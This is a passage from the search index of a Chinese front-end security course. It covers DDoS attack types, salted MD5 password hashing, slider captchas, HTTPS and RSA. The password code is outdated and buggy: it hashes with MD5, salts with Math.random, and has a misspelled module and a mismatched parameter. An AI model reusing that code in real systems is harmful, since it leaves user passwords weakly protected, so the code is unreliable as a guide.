\u5740\u7684\u8bf7\u6c42\u91cf\uf97e\u5728\u6bcf\u79d2200\u6b21~300\u6b21\u3002\u6211\u770b\u8bbf\u95ee\u2f47\u65e5\u5fd7\u7684\u65f6\u5019\uff0c\u5c31\u89c9\u5f97\u90a3\u4e9b\u8bf7\u6c42\u50cf\u6d2a\u2f54\u6c34\u2f00\u4e00\u6837\u6d8c\u6765\uff0c\u2f00\u4e00\u7728\u773c\u5c31\u662f \u2f00\u4e00\u2f24\u5927\u5806\uff0c\u2f0f\u51e0\u5206\u949f\u7684\u65f6\u95f4\uff0c\u2f47\u65e5\u5fd7\u2f42\u6587\u4ef6\u7684\u4f53\u79ef\u5c31\u2f24\u5927\u4e86100MB\u3002\u8bf4\u5b9e\u8bdd\uff0c\u8fd9\u53ea\u80fd\u7b97\u2f29\u653b\u51fb\uff0c\u4f46\u662f\u6211\u7684\u4e2a\u2f08\u4eba\u2f79\u7f51\u7ad9 \u6ca1\u6709\u4efb\u4f55\u9632\u62a4\uff0c\u670d\u52a1\u5668\ufa38\u8fd8\u662f\u8ddf\u5176\u4ed6\u2f08\u4eba\u5171\u4eab\u7684\uff0c\u8fd9\u79cd\u6d41\u91cf\uf97e\u2f00\u4e00\u6765\u2f74\u7acb\u523b\u5c31\u4e0b\u7ebf\u4e86\u3002</p> <p>\u5e38\u2ec5\u89c1\u653b\u51fb\u2f45\u5f0f</p> <p>SYN Flood</p> <p>\u6b64\u653b\u51fb\u901a\u8fc7\u5411\u2f6c\u76ee\u6807\u53d1\u9001\u5177\u6709\u6b3a\u9a97\u6027\u6e90IP\u5730\u5740\u7684\u2f24\u5927\u91cf\uf97eTCP\u201c\u521d\u59cb\u8fde\u63a5\u8bf7\u6c42\u201dSYN\u6570\u636e\u5305\u6765\u5229\uf9dd\u2f64TCP\u63e1 \u2f3f\u3002\u2f6c\u76ee\u6807\u673a\u5668\ufa38\u54cd\u5e94\u6bcf\u4e2a\u8fde\u63a5\u8bf7\u6c42\uff0c\u7136\u540e\u7b49\u5f85\u63e1\u2f3f\u4e2d\u7684\u6700\u540e\u2f00\u4e00\u6b65\uff0c\u8fd9\u2f00\u4e00\u6b65\u4ece\u672a\u53d1\u2f63\u751f\u8fc7\uff0c\u8017\u5c3d\u4e86\u8fdb\u7a0b \u4e2d\u7684\u2f6c\u76ee\u6807\u8d44\u6e90\u3002</p> <p>HTTP Flood</p> <p>\u6b64\u653b\u51fb\u7c7b\u4f3c\u4e8e\u540c\u65f6\u5728\u591a\u4e2a\u4e0d\uf967\u540c\u8ba1\u7b97\u673a\u4e0a\u53cd\u590d\u6309Web\u6d4f\u89c8\u5668\ufa38\u4e2d\u7684\u5237\u65b0 - \u2f24\u5927\u91cf\uf97eHTTP\u8bf7\u6c42\u6cdb\u6ee5\u670d\u52a1\u5668\ufa38\uff0c \u5bfc\u81f4\u62d2\u7edd\u670d\u52a1\u3002</p> <p>\u9632\u5fa1\u2f3f\u6bb5</p> <p>- \u5907\u4efd\u2f79\u7f51\u7ad9 \u5907\u4efd\u2f79\u7f51\u7ad9\u4e0d\uf967\u2f00\u4e00\u5b9a\u662f\u5168\u529f\u80fd\u7684\uff0c\u5982\u679c\u80fd\u505a\u5230\u5168\u9759\u6001\u6d4f\u89c8\uff0c\u5c31\u80fd\u6ee1\u2f9c\u8db3\u9700\u6c42\u3002\u6700\u4f4e\u9650\u5ea6\u5e94\u8be5\u53ef\u4ee5\u663e\u793a\u516c\u544a\uff0c\u544a\u8bc9\u2f64\u6237\uff0c\u2f79\u7f51\u7ad9\u51fa\u4e86\u95ee\u9898\uff0c\u6b63\u5728\u5168\u2f12\u529b\uf98a\u62a2\u4fee\u3002  - HTTP \u8bf7\u6c42\u7684\u62e6\u622a \u2fbc\u9632IP -\u9760\u8c31\u7684\u8fd0\u8425\u5546 \u591a\u4e2a Docker</p> <p>\u786c\u4ef6 \u670d\u52a1\u5668\ufa38 \u9632\u2f55\u706b\u5899 - \u5e26\u5bbd\u6269\u5bb9 + CDN</p> <p>\u63d0\u2fbc\u72af\u7f6a\u6210\u672c</p>"},{"location":"ebook-kaikeba-frontend/20-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E9%98%B2%E5%BE%A1%E6%89%8B%E6%AE%B5/","title":"\u9632\u5fa1\u624b\u6bb5","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 19718  \u9605\u8bfb40\u5206\u949f</p> <p>\u6709\u4e00\u4e9b\u5185\u5bb9\u56fe\u7247\u5728 PDF \u8bfe\u4ef6\u4e2d\uff0c\u4fdd\u7559\u3002\u5b89\u5168\u5185\u5bb9\u4e0d\u9700\u8981\u5168\u90e8\u5b66\u4f1a\uff08\u4e3b\u8981\u662f\u540e\u7aef\u548c\u8fd0\u7ef4\uff09\uff0c\u9762\u8bd5\u524d\u719f\u6089\u4e00\u4e0b\u5373\u53ef\u3002</p> <p>\u523b\u610f\u7ec3\u4e60\uff1a\u81f3\u5c11\u628a\u6838\u5fc3\u4ee3\u7801\u6284\u5199\u4e09\u6b21\uff0c\u8fd9\u6837\u624d\u80fd\u5b66\u5230\u3002\u5982\u679c\u662f\u5355\u7eaf\u5b66\u4e60\u4e00\u6b21\uff0c\u6ca1\u6709\u590d\u4e60\uff0c\u7b2c\u4e00\u6b21\u4e5f\u6ca1\u6709\u5b66\u4f1a\uff0c\u90a3\u771f\u7684\u5c31\u662f\u5b66\u4e00\u70b9\u5fd8\u8bb0\u4e00\u70b9\u4e86\u3002</p>"},{"location":"ebook-kaikeba-frontend/20-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E9%98%B2%E5%BE%A1%E6%89%8B%E6%AE%B5/#_2","title":"\u8bfe\u5802\u76ee\u6807","text":"<ul> <li>\u5bc6\u7801\u5f3a\u5316</li> <li>\u4eba\u673a\u8bc6\u522b</li> <li>HTTPS</li> <li>\u6d4f\u89c8\u5668\u5b89\u5168\u63a7\u5236</li> <li>CSP(Content-Security-Policy) </li> <li>\u5bc6\u7801\u5b66</li> <li>\u6458\u8981 - md5 sha1 sha256 -hash\uff08\u4e0d\u540c\u7684\u54c8\u5e0c\u52a0\u5bc6\u7b97\u6cd5\uff09</li> <li>\u5bf9\u79f0\u52a0\u5bc6</li> <li>\u975e\u5bf9\u79f0\u52a0\u5bc6\uff08SSL\uff09</li> </ul>"},{"location":"ebook-kaikeba-frontend/20-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E9%98%B2%E5%BE%A1%E6%89%8B%E6%AE%B5/#_3","title":"\u77e5\u8bc6\u8981\u70b9","text":""},{"location":"ebook-kaikeba-frontend/20-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E9%98%B2%E5%BE%A1%E6%89%8B%E6%AE%B5/#1-30min","title":"1. \u5bc6\u7801\u5b89\u5168(30min)","text":"<p>\u6cc4\u9732\u6e20\u9053</p> <pre><code>\u6570\u636e\u5e93\u88ab\u5077\n\u670d\u52a1\u5668\u88ab\u5165\u4fb5\n\u901a\u8baf\u88ab\u7a83\u542c\n\u5185\u90e8\u4eba\u5458\u6cc4\u9732\n\u5176\u4ed6\u7f51\u7ad9(\u649e\u5e93)\n</code></pre> <p>\u9632\u5fa1</p> <p>\u4f7f\u7528\u54c8\u5e0c\u7b97\u6cd5\uff0c\u660e\u6587 - \u5bc6\u6587 - \u4e00\u4e00\u5bf9\u5e94</p> <pre><code>\u4e25\u7981\u660e\u6587\u5b58\u50a8\uff08\u670d\u52a1\u5668\u4e2d\u7684\u5bc6\u7801\u4f7f\u7528\u52a0\u5bc6\u7b97\u6cd5\u5b58\u50a8\uff0c\u4ece\u52a0\u5bc6\u540e\u7684\u5b57\u7b26\u4e32\u65e0\u6cd5\u53cd\u63a8\u5bc6\u7801\u3002\u518d\u6b21\u8f93\u5165\u5bc6\u7801\u65f6\uff0c\u4f7f\u7528\u52a0\u5bc6\u7b97\u6cd5\u52a0\u5bc6\uff0c\u7136\u540e\u548c\u6570\u636e\u5e93\u4e2d\u7684\u5bc6\u7801\u9a8c\u8bc1\uff09\n\u5355\u5411\u53d8\u6362\n\u53d8\u6362\u590d\u6742\u5ea6\u8981\u6c42\uff08\u6c42\u4e24\u6b21md5\uff09\n\u5bc6\u7801\u590d\u6742\u5ea6\u8981\u6c42\n\u52a0\u76d0(\u9632\u62c6\u89e3)\n</code></pre> <p>\u96ea\u5d29\u6548\u5e94 - \u660e\u6587\u5c0f\u5e45\u53d8\u5316 \u5bc6\u6587\u5267\u70c8\u53d8\u5316</p> <p>\u5bc6\u6587 -\u660e\u6587\u65e0\u6cd5\u53cd\u63a8</p> <p>\u5bc6\u6587\u56fa\u5b9a\u2ed3\u5ea6 md5 sha1 sha256</p> <p>\u5bc6\u7801\u4f20\u8f93\u5b89\u5168</p> <p>https\u4f20\u8f93\uff1a\u9891\u6b21\u9650\u5236\uff1b\u524d\u7aef\u52a0\u5bc6\u610f\u4e49\u6709\u9650 - \u4f20\u8f93\u5c42\u52a0\u5bc6 \u4e0d\u4f1a\u6cc4\u9732 \u4f46\u4e0d\u4ee3\u8868\u4e0d\u80fd\u767b\u5f55</p> <p>\u6458\u8981\u52a0\u5bc6\u7684\u590d\u6742\u5ea6 md5\u53cd\u67e5</p> <p>https://www.cmd5.com/</p> <pre><code>// /app/password.js\nconst crypto = require('crypto');\n\n// HASH \u5de5\u5382\u51fd\u6570\uff08\u53c2\u6570\u662f\u54c8\u5e0c\u7684\u7c7b\u578b\uff09\nconst hash = (type, str) =&gt; {\n  return crypro.createHash(type).update(str).digest('hex');\n}\n\nconst md5 = (str) =&gt; hash('md5', str);\nconst sha1 = (str) =&gt; hash('sha1', str);\n\nconst encryptPassword = (salt, password) =&gt; md5(salt + 'abced@#4@%#$7' + password)\nconst psw = '123432!@#!@#@!#';\n\nconsole.log('md5', md5(psw))\nconsole.log('sha1', sha1(psw))\n\nmodule.exports = encryptPassword;\n</code></pre> <p>\u53ef\u4ee5\u5728 cmd5.com \u4e2d\u67e5\u8be2\u5bc6\u7801\uff0c\u5982\u679c\u7b80\u5355\u7684\u5bc6\u7801\uff0c\u7ecf\u8fc7\u4e00\u6b21 md5 \u6216\u8005 sha1 \u52a0\u5bc6\u540e\uff0c\u5f69\u8679\u4e91\u5f88\u5feb\u53ef\u4ee5\u7834\u89e3\u3002</p> <p>\u8ba8\u8bba\u95ee\u9898\uff1a</p> <p>\u4e24\u6b21MD5\u662f\u5426\u53ef\u53d6\u2014\u2014\u7b80\u5355\u7684\u5bc6\u7801\u7ecf\u8fc7\u4e24\u6b21\u52a0\u5bc6\uff0c\u4ecd\u7136\u53ef\u4ee5\u53cd\u5411\u8ba1\u7b97\u51fa\u6765\uff08111111\uff09</p> <p>\u53ea\u52a0\u76d0\u597d\u4e0d\u597d\u2014\u2014\u4e0d\u597d\uff0c\u56e0\u4e3a\u76d0\u4fdd\u5b58\u5728\u6570\u636e\u5e93\u4e2d\uff0c\u53ef\u80fd\u548c\u5bc6\u7801\u540c\u65f6\u4e22\u5931\uff08\u6240\u4ee5\u6709\u4e86\u4e2d\u95f4\u5b57\u7b26\u4e32\uff09</p> <p>\u4e2d\u95f4\u7684\u5b57\u7b26\u4e32\u7684\u4f5c\u7528\uff08\u5728\u76d0\u7684\u57fa\u7840\u4e0a\uff0c\u5728\u4ee3\u7801\u5c42\u9762\u52a0\u5165\u968f\u673a\u503c\uff0c\u786e\u4fdd\u52a0\u5bc6\u6548\u679c\uff09</p> <p>\u76d0\u6cc4\u9732\u662f\u5426\u4f1a\u6cc4\u9732\u5bc6\u7801\uff08\u5355\u7eaf\u76d0\u6cc4\u6f0f\uff0c\u8fd8\u6709\u4e2d\u95f4\u5b57\u7b26\u4e32\uff1b\u4f1a\u589e\u5927\u5bc6\u7801\u7834\u89e3\u7684\u98ce\u9669\uff09</p> <p>\u76d0\u548c\u5b57\u7b26\u4e32\u6cc4\u9732\uff0c\u5bc6\u7801\u662f\u5426\u53ef\u4ee5\u53cd\u63a8\uff0c\u4f46\u5bc6\u7801\u5f88\u590d\u6742\u662f\u5426\u4f1a\u88ab\u6cc4\u9732\uff08\u590d\u6742\u5bc6\u7801\u53cd\u63a8\u8f83\u56f0\u96be\uff09</p> <p>\u52a0\u5bc6\u51fd\u6570\uff08\u52a0\u76d0+\u81ea\u5b9a\u4e49\u968f\u673a\u5b57\u7b26\u4e32\uff09</p> <pre><code>function encryptPassword(salt, psd) {\n  return md5(salt + 'dfgh45#$%^' + pwd);\n}\n</code></pre> <p>// index.js</p> <p><pre><code>const encryptPassword = require('./password');\n\n// \u6ca1\u6709\u76d0\u7684\u60c5\u51b5\uff08\u628a\u6570\u636e\u5e93\u4e2d\u5df2\u7ecf\u6709\u7684\u5bc6\u7801\u52a0\u5bc6\uff09\nif (res.length !== 0 &amp;&amp; res[0].salt === null) {\n  console.log('no salt ..')\n  // \u6ca1\u6709\u76d0\uff0c\u76f4\u63a5\u9a8c\u8bc1\u5bc6\u7801\u662f\u5426\u6b63\u786e\n  if (password === res[0].password) {\n    // \u4f7f\u7528 SQL \u8bed\u53e5\u5c06\u672a\u52a0\u5bc6\u7684\u5bc6\u7801\u52a0\u5bc6\n    sql = `update test.user set salt = ?, password = ? where username = ?`;\n    // \u751f\u6210\u968f\u673a\u6570\u7684\u76d0\n    const salt = Math.random() * 99999 + new Date().getTime();\n    // \u6267\u884c SQL\uff08\u628a\u76d0\uff0c\u5bc6\u7801\uff0c\u7528\u6237\u540d\u4f20\u53c2\u8fdb\u53bb\uff09\uff0c\u5148\u5bf9\u5bc6\u7801\u52a0\u76d0\u52a0\u5bc6\n    res = await query(sql, [salt, encryptPassword(salt, password), username]);\n    // \u7136\u540e\u628a\u7528\u6237\u540d\u4fdd\u5b58\u5728 session \u9a8c\u8bc1\uff08\u5df2\u7ecf\u767b\u5f55\uff09\n    ctx.session.username = ctx.request.body.username;\n    // \u754c\u9762\u91cd\u5b9a\u5411\n    ctx.redirect('/?from=china');\n  }\n}\n// \u6709\u76d0\u7684\u60c5\u51b5\nelse {\n  console.log('has salt')\n  // \u9a8c\u8bc1\u5bc6\u7801\uff08\u4f7f\u7528\u76d0\u548c\u672a\u52a0\u5bc6\u7684\u5bc6\u7801\uff0c\u4f7f\u7528\u52a0\u5bc6\u51fd\u6570\u5904\u7406\uff09\uff0c\u4e0e\u6570\u636e\u5e93\u4e2d\u7684\u5df2\u52a0\u5bc6\u7684\u5bc6\u7801\u5bf9\u6bd4\n  if (encryptPassword(res[0].salt, password) === res[0].password) {\n    ctx.session.username = ctx.request.body.username\n    ctx.redirect('/?from=china')\n  }\n}\n</code></pre> \u4e00\u4e2a\u73b0\u4ee3\u7684\u7cfb\u7edf\u4e2d\uff0c\u7ba1\u7406\u5458\u6709\u6743\u9650\u91cd\u7f6e\u5bc6\u7801\uff0c\u4f46\u662f\u7ba1\u7406\u5458\u65e0\u6cd5\u76f4\u63a5\u4ece\u6570\u636e\u5e93\u4e2d\u62ff\u5230\u7528\u6237\u7684\u5bc6\u7801</p> <p>github \u7ba1\u7406\u5458\u53ef\u4ee5\u91cd\u65b0\u7ed9\u7528\u6237\u53d1\u9001\u90ae\u4ef6\u91cd\u7f6e\u5bc6\u7801\uff0c\u4f46\u662f\u65e0\u6cd5\u76f4\u63a5\u4ece\u6570\u636e\u5e93\u4e2d\u62ff\u5230\u7528\u6237\u7684\u5bc6\u7801\u548c\u5185\u5bb9</p>"},{"location":"ebook-kaikeba-frontend/20-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E9%98%B2%E5%BE%A1%E6%89%8B%E6%AE%B5/#2","title":"2. \u4eba\u673a\u9a8c\u8bc1 \u4e0e \u9a8c\u8bc1\u7801 \u6837\u5f0f\u548c\u53cd\u9762\u6559\u6750","text":"<p>https://veui.net/</p> <pre><code>$('.verify-code font').text()\n</code></pre> <p>http://www.lisa33xiaoq.net/1232.html</p> <p>\u524d\u7aef\uff1a\u9a8c\u8bc1\u7801\u8bf7\u6c42\uff08\u968f\u673a\u751f\u6210\u7f6e\u5750\u6807)\uff1b\u2edb\u63a7\u4fe1\u606f(\u6ed1\u52a8\u884c\u4e3a \u2eda\u9762\u884c\u4e3a) \u7528\u6765\u9a8c\u8bc1\u662f\u5426\u662f\u673a\u5668\u64cd\u4f5c\uff08\u5b9a\u65f6\u70b9\u51fb\u6309\u94ae\uff0c\u70b9\u51fb\u4f4d\u7f6e\u5b8c\u5168\u51c6\u786e\uff0c\u4e0d\u662f\u7b26\u5408\u6b63\u6001\u5206\u5e03\uff09</p> <p>\u540e\u7aef\u2edb\u63a7\u670d\u52a1\u5668\uff1a\u80cc\u666f\u62a0\u56fe (\u670d\u52a1\u7aef\u4fdd\u5b58\u968f\u673a\u62a0\u56fe\u4f4d\uff09\u6ed1\u52a8\u8ddd\u79bb\u503c\uff1b\u5982\u679c\u5224\u65ad\u662f\u98ce\u9669\u884c\u4e3a\uff0c\u90a3\u4e48\u4f1a\u7ed9\u540e\u7aef\u670d\u52a1\u5668\u6216\u8005\u524d\u7aef\u8fd4\u56de\uff0c\u518d\u6b21\u9a8c\u8bc1\u7b49</p> <p>\u6ed1\u52a8\u9a8c\u8bc1\u7801\u5b9e\u73b0\u539f\u7406</p> <p>1.\u670d\u52a1\u7aef\u968f\u673a\u751f\u6210\u62a0\u56fe\u548c\u5e26\u6709\u62a0\u56fe\u9634\u5f71\u7684\u80cc\u666f\u56fe\u7247\uff0c\u670d\u52a1\u7aef\u4fdd\u5b58\u968f\u673a\u62a0\u56fe\u4f4d\u7f6e\u5750\u6807\uff08x,y\uff09; \u5b58\u653e\u5728 session \u4e2d\u3002</p> <p>2.\u524d\u7aef\u5b9e\u73b0\u6ed1\u52a8\u4ea4\u4e92\uff0c\u5c06\u62a0\u56fe\u62fc\u5728\u62a0\u56fe\u9634\u5f71\u4e4b\u4e0a\uff0c\u83b7\u53d6\u5230\u7528\u6237\u6ed1\u52a8\u8ddd\u79bb\u503c\uff08X\uff0cY\uff09; </p> <p>3.\u524d\u7aef\u5c06\u7528\u6237\u6ed1\u52a8\u8ddd\u79bb\u503c\u4f20\u5165\u670d\u52a1\u7aef\uff0c\u670d\u52a1\u7aef\u6821\u9a8c\u8bef\u5dee\u662f\u5426\u5728\u5bb9\u8bb8\u8303\u56f4\u5185\uff08dx dy \u662f\u5426\u5728\u5141\u8bb8\u5185\uff09;</p> <p>\u5907\u6ce8\u8bf4\u660e:\u5355\u7eaf\u6821\u9a8c\u7528\u6237\u6ed1\u52a8\u8ddd\u79bb\u662f\u6700\u57fa\u672c\u7684\u6821\u9a8c,\u5904\u4e8e\u66f4\u9ad8\u5b89\u5168\u8003\u8651\uff0c\u53ef\u4ee5\u8003\u8651\u7528\u6237\u6ed1\u52a8\u6574\u4e2a\u8f68\u8ff9\u3001\u7528 \u6237\u5728\u5f53\u524d\u2eda\u9762\u4e0a\u7684\u884c\u4e3a\u7b49,\u53ef\u4ee5\u5c06\u5176\u7ec6\u5316\u590d\u6742\u5730\u6b65,\u53ef\u4ee5\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8bbe\u8ba1\u3002\u4ea6\u6216\u501f\u52a9\u7528\u6237\u884c\u4e3a\u6570\u636e\u5206\u6790 \u6a21\u578b,\u6700\u7ec8\u7684\u76ee\u6807\u90fd\u662f\u589e\u52a0\u975e\u6cd5\u7684\u6a21\u62df\u548c\u7ed5\u8fc7\u7684\u96be\u5ea6\u3002</p> <pre><code>if (req.session) {\n  req.session.dragCaptcha = {\n    x, y\n  }\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/20-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E9%98%B2%E5%BE%A1%E6%89%8B%E6%AE%B5/#3-https-30min","title":"3. HTTPS \u914d\u7f6e(30min)","text":"<p>https \u548c\u5bc6\u7801\u5b66 https://www.cnblogs.com/hai-blog/p/8311671.html </p> <p>\u6d4f\u89c8\u5668\u5982\u4f55\u9a8c\u8bc1SSL\u8bc1\u4e66 http://wemedia.ifeng.com/70345206/wemedia.shtml</p> <p>HTTP\u7684\u5f31\u70b9\uff08\u4ece\u6d4f\u89c8\u5668\u5230\u670d\u52a1\u5668\uff0c\u4e2d\u95f4\u9700\u8981\u7ecf\u8fc7\u5f88\u591a\u94fe\u8def\u670d\u52a1\u5668\uff09</p> <p>\u5371\u5bb3</p> <p>\u7a83\u542c:\u5bc6\u7801 \u654f\u611f\u4fe1\u606f</p> <p>\u7be1\u6539:\u63d2\u5165\u5e7f\u544a \u91cd\u5b9a\u5411\u5230\u5176\u4ed6\u7f51\u7ad9(JS \u548c Head\u5934) \u65f6\u4ee3\u8d8b\u52bf</p> <pre><code># \u67e5\u770b\u9700\u8981\u7ecf\u8fc7\u7684\u8282\u70b9\ntraceroute bing.com     \ntraceroute: Warning: bing.com has multiple addresses; using 204.79.197.200\ntraceroute to bing.com (204.79.197.200), 64 hops max, 52 byte packets\n 1  phicomm.me (192.168.2.1)  2.076 ms  1.522 ms  1.366 ms\n 2  192.168.1.1 (192.168.1.1)  1.912 ms  1.807 ms  1.664 ms\n 3  10.70.0.1 (10.70.0.1)  5.890 ms  4.376 ms  3.597 ms\n 4  125.34.172.5 (125.34.172.5)  6.877 ms  10.509 ms  7.930 ms\n\n\n# github \u9700\u8981\u7684\u66f4\u591a\ntraceroute github.com\ntraceroute to github.com (20.205.243.166), 64 hops max, 52 byte packets\n 1  phicomm.me (192.168.2.1)  2.041 ms  1.459 ms  1.381 ms\n 2  192.168.1.1 (192.168.1.1)  2.514 ms  2.853 ms  1.671 ms\n 3  10.70.0.1 (10.70.0.1)  3.560 ms  3.428 ms  3.671 ms\n 4  125.34.173.1 (125.34.173.1)  5.120 ms  5.496 ms  4.991 ms\n 5  * 125.33.186.113 (125.33.186.113)  6.615 ms *\n 6  219.158.15.38 (219.158.15.38)  39.455 ms * *\n 7  219.158.24.126 (219.158.24.126)  91.715 ms\n    219.158.19.66 (219.158.19.66)  95.448 ms\n    219.158.97.2 (219.158.97.2)  69.038 ms\n 8  219.158.97.29 (219.158.97.29)  48.463 ms  45.069 ms\n    219.158.103.26 (219.158.103.26)  50.318 ms\n 9  219.158.10.30 (219.158.10.30)  53.144 ms\n    219.158.10.62 (219.158.10.62)  50.188 ms  44.750 ms\n10  219.158.33.114 (219.158.33.114)  46.421 ms  47.285 ms  47.581 ms\n11  ae23-0.ear02.hkg30.ntwk.msn.net (104.44.43.137)  56.336 ms  52.847 ms  49.812 ms\n12  be-21-0.ibr01.hkg30.ntwk.msn.net (104.44.33.117)  83.360 ms\n    be-20-0.ibr02.hkg30.ntwk.msn.net (104.44.33.121)  224.856 ms *\n13  be-15-0.ibr02.sg2.ntwk.msn.net (104.44.19.124)  86.832 ms  86.149 ms  88.765 ms\n14  ae102-0.icr02.sg2.ntwk.msn.net (104.44.11.184)  82.432 ms\n    be-1-0.ibr02.sg3.ntwk.msn.net (104.44.7.18)  80.380 ms  83.290 ms\n15  ae120-0.icr01.sg3.ntwk.msn.net (104.44.20.22)  89.074 ms *  87.831 ms\n</code></pre> <p>\u76ee\u524d\u5168\u7403\u4e92\u8054\u7f51\u6b63\u5728\u4eceHTTP\u5411HTTPS\u7684\u5927\u8fc1\u79fb</p> <p>Chrome\u548c\u706b\u72d0\u6d4f\u89c8\u5668\u5c06\u5bf9\u4e0d\u91c7\u7528HTTPS \u52a0\u5bc6\u7684\u7f51\u7ad9\u63d0\u793a\u4e0d\u5b89\u5168</p> <p>\u82f9\u679c\u8981\u6c42\u6240\u6709APP\u901a\u4fe1\u90fd\u5fc5\u987b\u91c7\u7528HTTPS\u52a0\u5bc6</p> <p>\u5c0f\u7a0b\u5e8f\u5f3a\u5236\u8981\u6c42\u670d\u52a1\u5668\u7aef\u4f7f\u7528HTTPS\u8bf7\u6c42</p> <p>\u7279\u70b9</p> <ul> <li>\u4fdd\u5bc6\u6027 (\u9632\u6cc4\u5bc6)</li> <li>\u5b8c\u6574\u6027(\u9632\u7be1\u6539)</li> <li>\u771f\u5b9e\u6027(\u9632\u5047\u5192)</li> </ul> <p>HTTP + SSL = HTTPS</p> <p>\u4ec0\u4e48\u662fSSL\u8bc1\u4e66\uff1aSSL\u8bc1\u4e66\u7531\u6d4f\u89c8\u5668\u4e2d\u201c\u53d7\u4fe1\u4efb\u7684\u6839\u8bc1\u4e66\u9881\u53d1\u673a\u6784\u201d\u5728\u9a8c\u8bc1\u670d\u52a1\u5668\u8eab\u4efd\u540e\u9881\u53d1,\u5177\u6709\u7f51\u7ad9\u8eab\u4efd\u9a8c\u8bc1\u548c\u52a0\u5bc6\u4f20\u8f93</p> <p>\u53cc\u91cd\u529f\u80fd</p> <p>\u5bc6\u7801\u5b66</p> <p>\u5bf9\u79f0\u52a0\u5bc6\uff1a\u5bf9\u79f0\u52a0\u5bc6\u7684\u4e00\u5927\u7f3a\u70b9\u662f\u5bc6\u94a5\u7684\u7ba1\u7406\u4e0e\u5206\u914d\uff0c\u6362\u53e5\u8bdd\u8bf4\uff0c\u5982\u4f55\u628a\u5bc6\u94a5\u53d1\u9001\u5230\u9700\u8981\u89e3\u5bc6\u4f60\u7684\u6d88\u606f\u7684\u4eba\u7684\u624b\u91cc\u662f\u4e00\u4e2a\u95ee\u9898\u3002\u5728\u53d1\u9001\u5bc6\u94a5\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5bc6\u94a5\u6709\u5f88\u5927\u7684\u2edb\u9669\u4f1a\u88ab\u9ed1\u5ba2\u4eec\u62e6\u622a\u3002\u73b0\u5b9e\u4e2d\u901a\u5e38\u7684\u505a\u6cd5\u662f\u5c06\u5bf9\u79f0\u52a0\u5bc6\u7684\u5bc6\u94a5\u8fdb\u884c\u975e\u5bf9\u79f0\u52a0\u5bc6\uff0c\u7136\u540e\u4f20\u9001\u7ed9\u9700\u8981\u5b83\u7684\u4eba\u3002\u4e3b\u8981\u7684\u7b97\u6cd5\uff1aDES\u3002</p> <p>\u4e0d\u5bf9\u79f0\u52a0\u5bc6\uff1a\u4ea7\u751f\u4e00\u5bf9\u79d8\u94a5\uff1a\u516c\u94a5\u8d1f\u8d23\u52a0\u5bc6\uff1b\u79c1\u94a5\u8d1f\u8d23\u89e3\u5bc6\u3002\u79c1\u94a5\u65e0\u6cd5\u89e3\u5f00\u8bf4\u660e\u516c\u94a5\u65e0\u6548 - \u6297\u62b5\u8d56\u3002\u8ba1\u7b97\u590d\u6742\u5bf9\u6027\u80fd\u6709\u5f71\u54cd(\u6781\u7aef\u60c5\u51b5\u4e0b 1000\u500d)\u3002\u5e38\u2ec5\u7b97\u6cd5 RSA(\u5927\u8d28\u6570)\u3001Elgamal\u3001\u80cc\u5305\u7b97\u6cd5\u3001Rabin\u3001D-H\u3001ECC(\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u7b97\u6cd5)\u3002\u533a\u5757\u94fe\u4f7f\u7528\u8fd9\u4e2a\u7b97\u6cd5\u3002</p> <p>RSA\u539f\u7406</p> <p>http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html</p> <p>\u53ea\u80fd\u88ab1\u548c\u672c\u8eab\u6574\u9664\u7684\u6570\u53eb\u8d28\u6570,\u4f8b\u598213,\u8d28\u6570\u662f\u65e0\u7a77\u591a\u7684.\u5f97\u5230\u4e24\u4e2a\u5de8\u5927\u8d28\u6570\u7684\u4e58\u79ef\u662f\u7b80\u5355\u7684\u4e8b,\u4f46\u60f3 \u4ece\u8be5\u4e58\u79ef\u53cd\u63a8\u51fa\u8fd9\u4e24\u4e2a\u5de8\u5927\u8d28\u6570\u5374\u6ca1\u6709\u4efb\u4f55\u6709\u6548\u7684\u529e\u6cd5,\u8fd9\u79cd\u4e0d\u53ef\u9006\u7684\u5355\u5411\u6570\u5b66\u5173\u7cfb,\u662f\u56fd\u9645\u6570\u5b66\u754c \u516c\u8ba4\u7684\u8d28\u56e0\u6570\u5206\u89e3\u96be\u9898.  R\u3001S\u3001A\u4e09\u4eba\u5de7\u5999\u5229\u7528\u8fd9\u4e00\u5047\u8bf4,\u8bbe\u8ba1\u51faRSA\u516c\u5319\u52a0\u5bc6\u7b97\u6cd5\u7684\u57fa\u672c\u539f\u7406:</p> <p>1\u3001\u8ba9\u8ba1\u7b97\u673a\u968f\u673a\u751f\u6210\u4e24\u4e2a\u5927\u8d28\u6570p\u548cq,\u5f97\u51fa\u4e58\u79efn; 2\u3001\u5229\u7528p\u548cq\u6709\u6761\u4ef6\u7684\u751f\u6210\u52a0\u5bc6\u5bc6\u94a5e; 3\u3001\u901a\u8fc7\u4e00\u7cfb\u5217\u8ba1\u7b97,\u5f97\u5230\u4e0en\u4e92\u4e3a\u8d28\u6570\u7684\u89e3\u5bc6\u5bc6\u94a5d,\u7f6e\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u624d\u77e5\u9053\u7684\u5730\u65b9;</p> <p>4\u3001\u64cd\u4f5c\u7cfb\u7edf\u5c06n\u548ce\u5171\u540c\u4f5c\u4e3a\u516c\u5319\u5bf9\u5916\u53d1\u5e03,\u5c06\u79c1\u5319d\u79d8\u5bc6\u4fdd\u5b58,\u628a\u521d\u59cb\u8d28\u6570p\u548cq\u79d8\u5bc6\u4e22\u5f03. \u56fd\u9645\u6570\u5b66\u548c\u5bc6\u7801\u5b66\u754c\u5df2\u8bc1\u660e,\u4f01\u56fe\u5229\u7528\u516c\u5319\u548c\u5bc6\u6587\u63a8\u65ad\u51fa\u660e\u6587--\u6216\u8005\u4f01\u56fe\u5229\u7528\u516c\u5319\u63a8\u65ad\u51fa\u79c1\u5319\u7684\u96be 